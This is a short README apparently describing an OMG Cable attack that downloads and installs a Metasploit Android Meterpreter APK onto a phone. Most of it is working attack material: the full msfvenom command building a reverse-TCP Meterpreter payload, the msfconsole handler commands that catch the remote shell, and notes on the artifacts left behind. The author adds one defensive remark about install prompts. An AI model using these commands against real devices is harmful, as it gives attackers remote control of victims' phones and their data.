# Android Meterpreter

An OMG Cable payload which downloads and installs an APK onto an Android device. Here are the high-level notes.

I would like to see operating systems prompt for authentication when performing risky behaviors, such as installing a new app.

## Generate Payload

Regular `msfvenom` payload generation.

```D
$ msfvenom -p android/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=5555 -o /data/omg.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 79592 bytes
Saved as: /data/omg.apk
```

## Handler

These instructions can also be saved and loaded as an `rc` file via `msfconsole -r`.

```
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload android/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lport 5555
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > run
```

## Miscellaneous

Some apparent artifacts remain. This is an abbreviated list.

* Notification shows apk was downloaded
* APK remains installed as MainActivity
  * `app_uninstall com.metasploit.stage` does not remove the apk
